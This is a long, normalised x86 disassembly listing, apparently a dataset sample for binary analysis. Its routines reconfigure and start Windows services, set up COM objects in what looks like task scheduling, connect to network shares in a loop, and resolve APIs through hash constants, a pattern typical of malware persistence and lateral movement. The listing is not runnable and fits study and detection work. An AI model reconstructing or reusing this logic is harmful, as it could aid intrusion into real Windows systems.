call [ SysAllocString@IAT ]
lea edx [ ebp - 0x28 ]
push edx
sub esp 0x10
cmp [ ebp + 0xc ] 0x28
lea esi [ ebp - 0x5c ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0x20 ]
mov ecx [ eax ]
movsd [ edi ] [ esi ]
lea esi [ ebp - 0x5c ]
jge r-xdata
mov [ ebp - 0x4 ] ebx
mov eax [ ebp - 0x7c ]
mov ebx eax
cmp eax edi
je r-xdata
mov eax [ esi ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub esi 0x4
dec edi
jne r-xdata
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x7c ]
mov ebx eax
cmp eax edi
je r-xdata
mov eax [ esi ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
dec ebx
sub esi 0x4
cmp ebx edi
jne r-xdata
jmp r-xdata
push 0x5
sub esp 0x10
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
sub esp 0x10
movsd [ edi ] [ esi ]
mov edi esp
push 0x6
push [ ebp - 0x18 ]
lea esi [ ebp - 0x74 ]
push r--data
push 0x3
sub esp 0x10
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
sub esp 0x10
movsd [ edi ] [ esi ]
mov edi esp
push 0x6
push [ ebp - 0x18 ]
lea esi [ ebp - 0x5c ]
push r--data
jmp r-xdata
lea esi [ ebp + eax * 4 - 0x100 ]
lea esi [ ebp + eax * 4 - 0x100 ]
mov edx [ ebp - 0x28 ]
lea ecx [ ebp - 0xfc ]
call sub_40a46e
cmp [ ebp + 0xc ] 0x32
je r-xdata
lea eax [ ebp - 0x74 ]
push eax
call [ VariantClear@IAT ]
mov [ ebp - 0x4 ] ebx
mov eax [ ebp - 0x7c ]
mov edi eax
test eax eax
je r-xdata
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x44 ]
test eax eax
jns r-xdata
mov eax [ esi ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
dec ebx
sub esi 0x4
cmp ebx edi
jne r-xdata
jmp r-xdata
mov eax [ esi ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
dec ebx
sub esi 0x4
cmp ebx edi
jne r-xdata
jmp r-xdata
lea eax [ ebp - 0x74 ]
push eax
call [ VariantClear@IAT ]
mov [ ebp - 0x4 ] ebx
mov eax [ ebp - 0x7c ]
mov edi eax
test eax eax
je r-xdata
mov eax [ ebp - 0x28 ]
mov ecx [ eax ]
lea edx [ ebp - 0x30 ]
push edx
sub esp 0x10
mov edi esp
lea esi [ ebp - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x30 ]
test eax eax
jns r-xdata
lea esi [ ebp + eax * 4 - 0x100 ]
mov al 0x1
lea esi [ ebp + eax * 4 - 0x100 ]
mov edx [ ebp - 0x30 ]
lea ecx [ ebp - 0xfc ]
call sub_40a46e
lea eax [ ebp - 0x74 ]
push eax
call [ VariantClear@IAT ]
mov [ ebp - 0x4 ] ebx
mov eax [ ebp - 0x7c ]
mov edi eax
test eax eax
je r-xdata
mov eax [ esi ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub esi 0x4
dec edi
jne r-xdata
jmp r-xdata
mov eax [ esi ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub esi 0x4
dec edi
jne r-xdata
lea esi [ ebp + eax * 4 - 0x100 ]
mov eax [ esi ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub esi 0x4
dec edi
jne r-xdata
jmp r-xdata
sub_40ac4b
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x85c
push ebx
push esi
push edi
push [ ebp + 0x8 ]
call sub_4057a1
push 0x1
xor ebx ebx
push ebx
push ebx
mov [ esp + 0x2c ] eax
call [ OpenSCManagerW@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
push ebx
call [ CoInitialize@IAT ]
test eax eax
jns r-xdata
push 0x14
push r--data
push esi
call [ OpenServiceW@IAT ]
push esi
mov esi [ CloseServiceHandle@IAT ]
mov edi eax
call esi
cmp edi ebx
je r-xdata
push ebx
push ebx
push ebx
push 0x3
push 0x6
push ebx
push ebx
push 0xffffffff
push ebx
call [ CoInitializeSecurity@IAT ]
test eax eax
jns r-xdata
xor al al
lea eax [ esp + 0x30 ]
push eax
push edi
call [ QueryServiceStatus@IAT ]
test eax eax
je r-xdata
mov esi [ ebp + 0x8 ]
mov [ esp + 0x1c ] ebx
call sub_4066e2
cmp eax 0x3
jl r-xdata
call [ CoUninitialize@IAT ]
mov al bl
jmp r-xdata
push edi
call esi
cmp [ esp + 0x34 ] 0x4
je r-xdata
lea eax [ esp + 0x18 ]
push eax
push rw-data
push 0x1
push ebx
push rw-data
call [ CoCreateInstance@IAT ]
test eax eax
jns r-xdata
push [ esp + 0x20 ]
lea ecx [ esp + 0x20 ]
push esi
call sub_40a489
mov edi [ esp + 0x24 ]
pop ecx
pop ecx
mov [ esp + 0x10 ] al
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push 0xffffffff
push 0x2
push 0xffffffff
push edi
call [ ChangeServiceConfigW@IAT ]
push ebx
push ebx
push edi
call [ StartServiceW@IAT ]
mov eax [ esp + 0x18 ]
mov ecx [ eax ]
lea edx [ esp + 0x14 ]
push edx
mov edi rw-data
push edi
mov esi r--data
push esi
push eax
call [ ecx + 0x18 ]
mov [ esp + 0x1c ] eax
cmp eax ebx
jge r-xdata
mov [ esp + 0x10 ] bl
jmp r-xdata
cmp edi ebx
je r-xdata
cmp [ esp + 0x20 ] 0x28
mov eax [ esp + 0x14 ]
mov ecx [ eax ]
jge r-xdata
mov eax [ esp + 0x18 ]
mov ecx [ eax ]
lea edx [ esp + 0x14 ]
push edx
push edi
push rw-data
push esi
push eax
call [ ecx + 0x20 ]
mov [ esp + 0x1c ] eax
cmp eax ebx
jge r-xdata
mov bl [ esp + 0x10 ]
jmp r-xdata
push edi
call sub_405c44
push ebx
push r--data
push 0x2000
push eax
call [ ecx + 0x70 ]
lea eax [ esp + 0x2c ]
push eax
lea eax [ esp + 0x6c ]
push eax
mov [ esp + 0x34 ] 0x400
call [ GetUserNameW@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
jmp r-xdata
push r--data
call sub_4016c1
push eax
push [ ebp + 0x8 ]
call sub_404e26
mov edi eax
cmp edi ebx
jne r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
jmp r-xdata
cmp [ esp + 0x1c ] ebx
jge r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ eax ]
push ebx
lea edx [ esp + 0x6c ]
push edx
jmp r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ eax ]
push edi
push eax
call [ ecx + 0x80 ]
test eax eax
jns r-xdata
call sub_4016c1
mov edi eax
call sub_403fca
mov edi eax
cmp edi ebx
je r-xdata
push eax
call [ ecx + 0x78 ]
mov [ esp + 0x1c ] eax
push 0x4
push [ ebp + 0x8 ]
lea esi [ esp + 0x68 ]
call sub_4039ef
mov eax [ esp + 0x14 ]
mov ecx [ eax ]
mov edx esi
push edx
push eax
call [ ecx + 0x88 ]
test eax eax
mov eax [ esp + 0x14 ]
mov ecx [ eax ]
js r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov eax [ esp + 0x18 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov [ esp + 0x10 ] bl
jmp r-xdata
push r--data
push eax
call [ ecx + 0x90 ]
test eax eax
mov eax [ esp + 0x14 ]
mov ecx [ eax ]
js r-xdata
push 0xffffffff
push eax
call [ ecx + 0xa8 ]
mov eax [ esp + 0x14 ]
mov ecx [ eax ]
push 0x20
push eax
call [ ecx + 0x98 ]
mov eax [ esp + 0x14 ]
mov ecx [ eax ]
lea edx [ esp + 0x24 ]
push edx
lea edx [ esp + 0x14 ]
push edx
push eax
call [ ecx + 0xc ]
test eax eax
js r-xdata
push 0x30
lea eax [ esp + 0x34 ]
push ebx
push eax
call sub_4130d0
add esp 0xc
push 0x2d
xor esi esi
inc esi
mov eax 0x80c
mov [ esp + 0x3e ] ax
mov eax esi
mov [ esp + 0x40 ] ax
mov [ esp + 0x42 ] ax
pop eax
mov [ esp + 0x42 ] ax
mov eax esi
mov [ esp + 0x38 ] ax
mov [ esp + 0x36 ] ax
push 0x30
mov eax 0x7d0
mov [ esp + 0x38 ] ax
pop eax
mov [ esp + 0x30 ] ax
xor eax eax
cmp [ esp + 0x20 ] 0x28
push 0x13
setl al
lea edx [ esp + 0x34 ]
mov [ esp + 0x48 ] 0xa
mov [ esp + 0x4c ] esi
add eax 0x6
mov [ esp + 0x54 ] eax
pop eax
mov [ esp + 0x40 ] ax
mov eax esi
mov [ esp + 0x54 ] ax
mov eax [ esp + 0x24 ]
mov ecx [ eax ]
push edx
push eax
call [ ecx + 0xc ]
test eax eax
js r-xdata
mov eax [ esp + 0x24 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov eax [ esp + 0x14 ]
mov ecx [ eax ]
lea edx [ esp + 0x28 ]
push edx
push rw-data
push eax
call [ ecx ]
test eax eax
js r-xdata
mov eax [ esp + 0x28 ]
mov ecx [ eax ]
push esi
push ebx
push eax
call [ ecx + 0x18 ]
mov eax [ esp + 0x28 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
cmp [ esp + 0x20 ] 0x32
je r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov eax [ esp + 0x18 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov [ esp + 0x10 ] 0x1
mov eax [ esp + 0x14 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x30 ]
test eax eax
js r-xdata
sub_40afe2
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x294
push ebx
push esi
push edi
push [ ebp + 0x8 ]
call sub_4057a1
cmp eax 0x28
jl r-xdata
xor al al
mov ebx r--data
push ebx
call sub_4016c1
push eax
push [ ebp + 0x8 ]
call sub_404e26
mov [ esp + 0xc ] eax
test eax eax
jne r-xdata
push r--data
lea eax [ esp + 0x9c ]
push eax
call [ lstrcpyW@IAT ]
push [ esp + 0xc ]
mov edi [ lstrcatW@IAT ]
lea eax [ esp + 0x9c ]
push eax
call edi
push r--data
lea eax [ esp + 0x9c ]
push eax
call edi
push 0x3
push [ ebp + 0x8 ]
lea esi [ esp + 0x18 ]
call sub_4039ef
mov eax esi
push eax
lea eax [ esp + 0x9c ]
push eax
call edi
lea eax [ esp + 0x98 ]
push eax
call [ lstrlenW@IAT ]
lea ecx [ eax + eax + 0x2 ]
xor edx edx
mov eax r--data
cmp edx eax
je r-xdata
call sub_4016c1
mov edi eax
call sub_403fca
mov [ esp + 0xc ] eax
test eax eax
je r-xdata
push 0x2
lea eax [ esp + 0x1c ]
push eax
push [ ebp + 0x8 ]
call sub_403a65
push ebx
lea eax [ esp + 0x1c ]
push eax
call edi
lea eax [ esp + 0x18 ]
push eax
call sub_404c6d
mov esi eax
test esi esi
je r-xdata
push ecx
lea ecx [ esp + 0x9c ]
push ecx
push 0x3
push r--data
push eax
push 0x80000002
call sub_40697b
mov al 0x1
jmp r-xdata
push 0xb9a
push rw-data
push esi
push [ ebp + 0x8 ]
call sub_404d1a
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
call sub_405c44
push [ esp + 0xc ]
call sub_405c44
push ebx
push esi
push [ ebp + 0x8 ]
call sub_404e26
mov ebx eax
test ebx ebx
je r-xdata
push r--data
push ebx
xor edi edi
call sub_402aaf
push ebx
call sub_405c44
sub_40b13c
push ebp
mov ebp esp
mov eax 0x1018
call sub_419050
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
push edi
mov [ ebp - 0x5 ] bl
call sub_405f3e
push ebx
push ebx
push ebx
push 0x1
push r--data
call [ rw-data ]
mov esi eax
cmp esi ebx
je r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
leave
retn
push 0x1
push 0x8000000
push 0x1
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
call [ rw-data ]
mov edi eax
cmp edi ebx
je r-xdata
push esi
call [ rw-data ]
push [ ebp + 0x20 ]
push edi
call [ rw-data ]
test eax eax
je r-xdata
push edi
call [ rw-data ]
push 0x2
push 0x2
push 0x80000000
push [ ebp + 0xc ]
push edi
call [ rw-data ]
mov [ ebp - 0x10 ] eax
cmp eax ebx
je r-xdata
mov [ ebp - 0x5 ] 0x1
cmp [ ebp - 0xc ] ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
push ebx
lea eax [ ebp - 0x1014 ]
push eax
mov eax [ ebp - 0xc ]
call sub_4060be
push [ ebp - 0x10 ]
call [ rw-data ]
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x200000
jl r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0x1000
lea eax [ ebp - 0x1014 ]
push eax
push [ ebp - 0x10 ]
mov [ ebp - 0xc ] ebx
call [ rw-data ]
test eax eax
je r-xdata
sub_40b228
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_41dbb8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x308
push ebx
push esi
push edi
lea esi [ esp + 0x38 ]
call sub_405d11
xor ebx ebx
mov [ esp + 0x31c ] ebx
lea eax [ esp + 0x48 ]
push eax
mov [ esp + 0x18 ] ebx
mov [ esp + 0x20 ] ebx
mov [ esp + 0x28 ] ebx
mov [ esp + 0x1c ] ebx
call sub_401108
mov [ esp + 0x31c ] 0x1
cmp [ rw-data ] ebx
jne r-xdata
mov [ esp + 0x20 ] ebx
mov [ esp + 0xf ] bl
mov [ esp + 0x2c ] 0x40412402
push r--data
call sub_4046cc
mov ebx r--data
mov ecx eax
call sub_4010c5
push r--data
mov [ rw-data ] eax
call sub_4046cc
mov ecx eax
call sub_4010c5
push r--data
mov [ rw-data ] eax
call sub_4046cc
mov ecx eax
call sub_4010c5
push r--data
mov [ rw-data ] eax
call sub_4046cc
mov ecx eax
call sub_4010c5
push r--data
mov [ rw-data ] eax
call sub_4046cc
mov ecx eax
call sub_4010c5
push r--data
mov [ rw-data ] eax
call sub_4046cc
mov ecx eax
call sub_4010c5
push r--data
mov [ rw-data ] eax
call sub_4046cc
mov ecx eax
call sub_4010c5
xor ecx ecx
mov [ rw-data ] eax
cmp [ rw-data ] ecx
je r-xdata
xor bl bl
lea eax [ esp + 0x10 ]
push eax
lea edi [ esp + 0x18 ]
mov esi ebx
mov [ esp + 0x14 ] 0x61a0c61a
call sub_4015ac
push [ esp + 0x14 ]
mov esi [ lstrcpyW@IAT ]
lea eax [ esp + 0x114 ]
push eax
call esi
push 0x80051a85
lea eax [ esp + 0x94 ]
push r--data
push eax
call [ wsprintfW@IAT ]
mov ebx [ lstrcatW@IAT ]
add esp 0xc
lea eax [ esp + 0x90 ]
push eax
lea eax [ esp + 0x114 ]
push eax
call ebx
lea eax [ esp + 0x110 ]
push eax
lea eax [ esp + 0x214 ]
push eax
call esi
lea eax [ esp + 0x10 ]
push eax
lea esi [ esp + 0x4c ]
mov [ esp + 0x14 ] 0x11bfc7eb
call sub_4015ac
push [ esp + 0x14 ]
lea eax [ esp + 0x114 ]
push eax
call ebx
push [ ebp + 0x8 ]
call sub_4054a4
push eax
push edx
lea eax [ esp + 0x98 ]
push r--data
push eax
call [ wsprintfW@IAT ]
add esp 0x10
lea eax [ esp + 0x90 ]
push eax
lea eax [ esp + 0x214 ]
push eax
call ebx
push [ esp + 0x14 ]
lea eax [ esp + 0x214 ]
push eax
call ebx
lea eax [ esp + 0x10 ]
push eax
mov [ esp + 0x14 ] 0x6bb8ddd8
call sub_4015ac
lea eax [ esp + 0x10 ]
push eax
lea esi [ esp + 0x2c ]
lea ecx [ esp + 0x4c ]
mov [ esp + 0x14 ] 0x11d0f59c
call sub_40157f
lea eax [ esp + 0x10 ]
push eax
lea edi [ esp + 0x20 ]
lea esi [ esp + 0x4c ]
mov [ esp + 0x14 ] 0x124a76f5
call sub_4015ac
lea eax [ esp + 0x10 ]
push eax
lea edi [ esp + 0x28 ]
mov [ esp + 0x14 ] 0x15289533
call sub_4015ac
lea eax [ esp + 0x10 ]
push eax
lea edi [ esp + 0x1c ]
mov [ esp + 0x14 ] 0x623397cf
call sub_4015ac
lea eax [ esp + 0x10 ]
push eax
lea esi [ esp + 0x38 ]
lea ecx [ esp + 0x4c ]
mov [ esp + 0x14 ] 0x7f4becad
call sub_40157f
lea eax [ esp + 0x10 ]
push eax
lea esi [ esp + 0x34 ]
lea ecx [ esp + 0x4c ]
mov [ esp + 0x14 ] 0x69b8e0a0
call sub_40157f
xor edi edi
mov [ esp + 0x31c ] cl
lea eax [ esp + 0x48 ]
push eax
call sub_40114f
or [ esp + 0x31c ] 0xffffffff
lea esi [ esp + 0x38 ]
call sub_405f2c
xor al al
cmp [ rw-data ] ecx
je r-xdata
mov ecx [ esp + 0x314 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
push [ esp + 0x18 ]
lea eax [ esp + 0x114 ]
push [ esp + 0x28 ]
push [ esp + 0x24 ]
push [ esp + 0x34 ]
push [ esp + 0x24 ]
push eax
lea eax [ esp + 0x50 ]
push eax
call sub_40b13c
add esp 0x1c
test al al
je r-xdata
mov esi [ esp + 0x3c ]
mov [ esp + 0xf ] 0x1
test esi esi
jne r-xdata
cmp [ rw-data ] ecx
je r-xdata
cmp [ esp + 0xf ] 0x0
jne r-xdata
mov esi [ esp + 0x3c ]
mov [ esp + 0xf ] 0x1
mov edi [ ebp + 0x10 ]
jle r-xdata
cmp [ rw-data ] ecx
je r-xdata
test esi esi
push [ ebp + 0x8 ]
mov eax [ esp + 0x38 ]
call sub_403b4d
inc edi
cmp edi [ esp + 0x30 ]
jl r-xdata
mov bl [ esp + 0xf ]
mov [ edi ] esi
jmp r-xdata
cmp esi [ edi ]
jge r-xdata
cmp [ rw-data ] ecx
je r-xdata
push [ esp + 0x18 ]
lea eax [ esp + 0x214 ]
push [ esp + 0x28 ]
xor esi esi
push [ esp + 0x24 ]
push [ esp + 0x34 ]
push [ esp + 0x24 ]
push eax
lea eax [ esp + 0x50 ]
push eax
call sub_40b13c
add esp 0x1c
test al al
je r-xdata
jmp r-xdata
mov [ esp + 0x31c ] 0x0
lea eax [ esp + 0x48 ]
push eax
call sub_40114f
or [ esp + 0x31c ] 0xffffffff
lea esi [ esp + 0x38 ]
call sub_405f2c
mov al bl
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ rw-data ] ecx
je r-xdata
inc [ esp + 0x20 ]
mov eax [ esp + 0x20 ]
mov [ esp + 0x10 ] eax
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x30 ]
push eax
lea eax [ esp + 0x74 ]
push eax
push ecx
call sub_40729d
pop ecx
push eax
call sub_407203
mov [ esp + 0x31c ] 0x2
push eax
lea ebx [ esp + 0x4c ]
call sub_40b695
mov [ esp + 0x31c ] 0x1
lea eax [ esp + 0x6c ]
push eax
call sub_40114f
mov eax [ esp + 0x50 ]
push 0xd
xor edx edx
pop ecx
div ecx
test eax eax
je r-xdata
push esi
push [ esp + 0x3c ]
push [ ebp + 0xc ]
call sub_413290
add esp 0xc
cmp eax ecx
je r-xdata
inc [ rw-data ]
xor ebx ebx
sub_40b695
mov eax [ esp + 0x4 ]
mov cx [ eax ]
push esi
push edi
lea edi [ eax + 0x4 ]
lea esi [ ebx + 0x4 ]
mov [ ebx ] cx
call sub_405e82
mov edi [ esp + 0xc ]
add edi 0x14
lea esi [ ebx + 0x14 ]
call sub_405e82
pop edi
mov eax ebx
pop esi
retn 0x4
sub_40b6c2
push ebp
mov ebp esp
sub esp 0x60
push ebx
push esi
push edi
xor ebx ebx
push ebx
push ebx
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x8 ]
mov [ ebp - 0xc ] ebx
push ebx
xor esi esi
mov [ ebp - 0x5 ] bl
call [ rw-data ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x10 ]
pop edi
mov [ eax ] esi
mov al [ ebp - 0x5 ]
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
cmp ecx ebx
je r-xdata
push 0x48
mov [ ebp - 0x5 ] 0x1
pop edx
lea eax [ ebp - 0x5c ]
mov [ eax ] bl
inc eax
dec edx
jne r-xdata
mov eax [ ecx ]
push ebx
lea edx [ ebp - 0x5c ]
push edx
push ecx
call [ eax + 0x30 ]
mov eax [ ebp + 0x10 ]
mov ecx [ eax ]
mov eax 0x200000
mov edx ecx
cmp ecx eax
jl r-xdata
cmp [ ebp - 0x54 ] edx
jb r-xdata
mov edx eax
mov edi [ ebp - 0x54 ]
cmp edi ebx
jbe r-xdata
mov [ ebp - 0x54 ] ecx
cmp ecx eax
jl r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
lea edx [ ebp - 0xc ]
push edx
mov edx [ ebp + 0xc ]
push edi
add edx esi
push edx
push eax
call [ ecx + 0xc ]
cmp eax 0x1
jne r-xdata
mov [ ebp - 0x54 ] eax
cmp eax ebx
jne r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
cmp eax 0x8000000a
jne r-xdata
add esi [ ebp - 0xc ]
sub edi [ ebp - 0xc ]
jmp r-xdata
xor esi esi
cmp esi [ ebp - 0x54 ]
jb r-xdata
jmp r-xdata
sub_40b78b
push ebp
mov ebp esp
sub esp 0x114
push esi
push edi
lea eax [ ebp - 0x14 ]
push eax
call [ UuidCreate@IAT ]
xor eax eax
mov [ ebp - 0x114 ] ax
movzx eax [ ebp - 0x5 ]
push eax
movzx eax [ ebp - 0x6 ]
push eax
movzx eax [ ebp - 0x7 ]
push eax
movzx eax [ ebp - 0x8 ]
push eax
movzx eax [ ebp - 0x9 ]
push eax
movzx eax [ ebp - 0xa ]
push eax
movzx eax [ ebp - 0xb ]
push eax
movzx eax [ ebp - 0xc ]
mov edi [ wsprintfW@IAT ]
push eax
movzx eax [ ebp - 0xe ]
push eax
movzx eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x14 ]
lea eax [ ebp - 0x114 ]
push r--data
push eax
call edi
add esp 0x34
push [ ebp + 0x8 ]
push ebx
call [ lstrcpyW@IAT ]
mov esi [ lstrcatW@IAT ]
push r--data
push ebx
call esi
call sub_4046cc
push 0x80051a85
lea eax [ ebp - 0x94 ]
push r--data
push eax
call edi
add esp 0xc
push r--data
push ebx
call esi
lea eax [ ebp - 0x94 ]
push eax
push ebx
call esi
call sub_4046cc
push eax
call sub_4054a4
push eax
push edx
lea eax [ ebp - 0x94 ]
push r--data
push eax
call edi
add esp 0x10
push r--data
push ebx
call esi
lea eax [ ebp - 0x94 ]
push eax
push ebx
call esi
push r--data
push ebx
call esi
push r--data
push ebx
call esi
push r--data
push ebx
call esi
push r--data
push ebx
call esi
lea eax [ ebp - 0x114 ]
push eax
lea eax [ ebp - 0x94 ]
push r--data
push eax
call edi
add esp 0xc
lea eax [ ebp - 0x94 ]
push eax
push ebx
call esi
pop edi
mov al 0x1
pop esi
leave
retn
sub_40b8b2
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_41db89
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax 0x8284
call sub_419050
push ebx
push esi
push edi
lea eax [ esp + 0x40 ]
push eax
call sub_401108
and [ esp + 0x829c ] 0x0
cmp [ rw-data ] 0x0
jne r-xdata
and [ esp + 0x14 ] 0x0
mov [ esp + 0x20 ] 0x40211202
push r--data
call sub_4046cc
mov ebx r--data
mov ecx eax
call sub_4010c5
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov bl [ esp + 0x13 ]
jmp r-xdata
lea eax [ esp + 0x38 ]
push eax
lea edi [ esp + 0x40 ]
mov esi ebx
mov [ esp + 0x3c ] 0x6bb8ddd8
call sub_4015ac
lea eax [ esp + 0x28 ]
push eax
lea edi [ esp + 0x20 ]
mov [ esp + 0x2c ] 0x11240e15
call sub_4015ac
lea eax [ esp + 0x34 ]
push eax
lea esi [ esp + 0x28 ]
mov ecx ebx
mov [ esp + 0x38 ] 0x7f4becad
call sub_40157f
lea eax [ esp + 0x18 ]
push eax
lea esi [ esp + 0x30 ]
mov ecx ebx
mov [ esp + 0x1c ] 0x69b8e0a0
call sub_40157f
push r--data
lea eax [ esp + 0x8c ]
push eax
call [ lstrcpyW@IAT ]
push [ esp + 0x3c ]
mov esi [ lstrcatW@IAT ]
lea eax [ esp + 0x8c ]
push eax
call esi
mov edi [ esp + 0x1c ]
cmp [ edi ] 0x2f
je r-xdata
inc [ rw-data ]
xor bl bl
or [ esp + 0x829c ] 0xffffffff
lea eax [ esp + 0x40 ]
push eax
call sub_40114f
mov ecx [ esp + 0x8294 ]
pop edi
pop esi
mov al bl
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
push edi
lea eax [ esp + 0x8c ]
push eax
call esi
mov esi [ ebp + 0x10 ]
mov eax [ esi ]
mov ecx [ ebp + 0xc ]
test eax eax
je r-xdata
push r--data
lea eax [ esp + 0x8c ]
push eax
call esi
lea eax [ esp + 0x88 ]
push eax
lea ebx [ esp + 0x294 ]
call sub_40b78b
pop ecx
xor edi edi
mov [ ecx ] 0x0
inc ecx
dec eax
jne r-xdata
push [ ebp + 0x8 ]
mov eax [ esp + 0x28 ]
call sub_403b4d
inc edi
cmp edi [ esp + 0x2c ]
jl r-xdata
push esi
push [ ebp + 0xc ]
lea eax [ esp + 0x298 ]
push eax
call sub_40b6c2
add esp 0xc
mov [ esp + 0x13 ] al
test al al
jne r-xdata
jmp r-xdata
inc [ esp + 0x14 ]
mov eax [ esp + 0x14 ]
mov [ esp + 0x30 ] eax
lea eax [ esp + 0x30 ]
push eax
lea eax [ esp + 0x24 ]
push eax
lea eax [ esp + 0x6c ]
push eax
push ecx
call sub_40729d
pop ecx
push eax
call sub_407203
mov [ esp + 0x829c ] 0x1
push eax
lea ebx [ esp + 0x44 ]
call sub_40b695
mov [ esp + 0x829c ] 0x0
lea eax [ esp + 0x64 ]
push eax
call sub_40114f
mov eax [ esp + 0x48 ]
push 0xd
xor edx edx
pop ecx
div ecx
test eax eax
je r-xdata
sub_40bac2
push ebp
mov ebp esp
sub esp 0x28
push esi
xor esi esi
mov al 0x1
jmp r-xdata
push 0x1
push edi
call [ WNetCancelConnectionW@IAT ]
add esi 0x2
cmp esi 0x30
jb r-xdata
pop esi
leave
retn
push 0x20
lea eax [ ebp - 0x24 ]
push 0x0
push eax
call sub_4130d0
movzx eax [ esi + rw-data ]
push eax
push r--data
push edi
mov [ ebp - 0x24 ] 0x2
mov [ ebp - 0x20 ] 0x1
mov [ ebp - 0x1c ] 0x9
mov [ ebp - 0x18 ] 0x7
call [ wsprintfW@IAT ]
mov eax [ ebp + 0x8 ]
and [ ebp - 0x8 ] 0x0
add esp 0x18
push 0x4
push [ ebp + 0xc ]
mov [ ebp - 0x10 ] eax
push [ ebp + 0x10 ]
lea eax [ ebp - 0x24 ]
push eax
mov [ ebp - 0x14 ] edi
call [ WNetAddConnection2W@IAT ]
test eax eax
je r-xdata
xor al al
sub_40bb48
push ebp
mov ebp esp
mov eax 0x2004
call sub_419050
push esi
call sub_4046cc
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor al al
push 0x1
push [ ebp + 0x8 ]
call sub_4047b2
mov esi eax
cmp esi 0xffffffff
je r-xdata
call sub_4046cc
and [ ebp + 0x8 ] 0x0
lea eax [ ebp - 0x2000 ]
test eax eax
je r-xdata
call sub_4046cc
push esi
call [ CloseHandle@IAT ]
mov al 0x1
jmp r-xdata
push 0x0
lea eax [ ebp + 0x8 ]
push eax
push 0x2000
lea eax [ ebp - 0x2000 ]
push eax
push esi
call [ ReadFile@IAT ]
test eax eax
je r-xdata
pop esi
leave
retn
mov eax [ ebp + 0x8 ]
test eax eax
jle r-xdata
push 0x0
lea ecx [ ebp - 0x2000 ]
push ecx
mov ecx [ ebp + 0xc ]
call sub_4060be
jmp r-xdata
sub_40bbd1
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_41db65
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x530
push ebx
push esi
push edi
lea esi [ esp + 0x40 ]
call sub_405d11
xor esi esi
mov [ esp + 0x544 ] esi
lea eax [ esp + 0x68 ]
push eax
call sub_401108
mov [ esp + 0x544 ] 0x1
mov eax [ r--data ]
mov [ esp + 0x50 ] eax
mov eax [ r--data ]
mov [ esp + 0x54 ] eax
xor eax eax
lea edi [ esp + 0x58 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
push r--data
stosd [ edi ]
call sub_402b4f
test al al
jne r-xdata
